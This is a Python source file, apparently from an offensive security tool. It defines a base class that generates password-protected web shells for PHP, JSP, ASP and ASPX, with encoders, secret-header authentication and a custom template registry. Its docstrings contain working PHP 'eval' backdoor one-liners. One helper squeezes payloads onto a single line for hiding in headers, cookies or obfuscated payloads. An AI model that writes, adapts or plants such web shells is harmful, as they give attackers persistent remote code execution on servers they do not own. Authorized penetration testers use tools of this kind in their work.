"""
Base class for webshell generation with custom template support.
"""

import logging

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class WebShell:
    """Base class for web shell generation with template management.

    Provides common functionality for generating web shells in various languages
    (PHP, JSP, ASP, ASPX) with password protection, custom encoders, and secret
    header authentication.

    Attributes:
        password: Password parameter name for webshell access
        encoder: Encoding method ('default', 'base64', etc.)
        secret_header: Optional HTTP header for additional authentication
        secret_value: Value for the secret header
        prefix: Code prepended to webshell
        suffix: Code appended to webshell
        _custom_templates: Class-level registry of custom templates

    Example:
        >>> shell = WebShell(password='mypass', encoder='base64')
        >>> template = '<?php eval(base64_decode($_POST["{{PASSWORD}}"])); ?>'
        >>> code = shell.apply_template(template)
        >>> code
        '<?php eval(base64_decode($_POST["mypass"])); ?>'
    """

    _custom_templates: dict[str, str] = {}

    def __init__(
        self,
        password: str = "pass",
        encoder: str = "default",
        secret_header: str | None = None,
        secret_value: str | None = None,
        prefix: str = "",
        suffix: str = "",
    ):
        """
        Initialize webshell generator.

        Args:
            password: Password parameter name for webshell (default: 'pass')
            encoder: Encoding type - varies by language (default: 'default')
            secret_header: Optional HTTP header name for authentication (e.g., 'X-Auth-Token')
            secret_value: Optional HTTP header value for authentication
            prefix: Code to prepend to webshell
            suffix: Code to append to webshell
        """
        self.password = password
        self.encoder = encoder
        self.secret_header = secret_header
        self.secret_value = secret_value
        self.prefix = prefix
        self.suffix = suffix

    def wrap_code(self, code: str) -> str:
        """Wrap code with configured prefix and suffix.

        Args:
            code: Core webshell code to wrap

        Returns:
            Code with prefix and suffix applied

        Example:
            >>> shell = WebShell(prefix='<?php ', suffix=' ?>')
            >>> shell.wrap_code('eval($_POST["cmd"]);')
            '<?php eval($_POST["cmd"]); ?>'
        """
        return f"{self.prefix}{code}{self.suffix}"

    def make_inline(self, code: str) -> str:
        """Compress code to single line by removing excess whitespace.

        Useful for embedding webshells in tight spaces like HTTP headers,
        cookies, or obfuscated payloads.

        Args:
            code: Multi-line code to compress

        Returns:
            Compressed single-line code

        Example:
            >>> shell = WebShell()
            >>> shell.make_inline('<?php\n  eval(\n    $_POST["cmd"]\n  );\n?>')
            '<?php eval( $_POST["cmd"] ); ?>'
        """
        code = code.replace("\t", " ")
        code = code.replace("\r", " ")
        code = code.replace("\n", " ")
        while "  " in code:
            code = code.replace("  ", " ")
        return code.strip()

    def apply_template(self, template: str) -> str:
        """
        Apply password and authentication placeholders to template.

        Args:
            template: Template string with placeholders

        Returns:
            Template with placeholders replaced
        """
        code = template.replace("{{PASSWORD}}", self.password)

        if self.secret_header and self.secret_value:
            code = code.replace(
                "{{SECRET_HEADER}}", self.secret_header.upper().replace("-", "_")
            )
            code = code.replace("{{SECRET_VALUE}}", self.secret_value)

        return code

    @classmethod
    def register_custom_template(cls, language: str, template: str) -> None:
        """
        Register a custom webshell template.

        Args:
            language: Language identifier (php, jsp, asp, aspx)
            template: Webshell code template (use {{PASSWORD}} placeholder)

        Example:
            WebShell.register_custom_template('php', '<?php eval($_POST["{{PASSWORD}}"]);?>')
        """
        key = language.lower()
        cls._custom_templates[key] = template
        logger.info(f"Registered custom webshell template: {key}")

    @classmethod
    def unregister_custom_template(cls, language: str) -> None:
        """Unregister a custom webshell template"""
        key = language.lower()
        if key in cls._custom_templates:
            del cls._custom_templates[key]
            logger.info(f"Unregistered custom webshell template: {key}")

    @classmethod
    def clear_custom_templates(cls) -> None:
        """Clear all custom templates"""
        cls._custom_templates.clear()
        logger.info("Cleared all custom webshell templates")

    @classmethod
    def list_custom_templates(cls) -> list[str]:
        """List all registered custom templates"""
        return list(cls._custom_templates.keys())

    def _get_custom_template(self, language: str) -> str | None:
        """Get custom template if registered"""
        return self._custom_templates.get(language.lower())
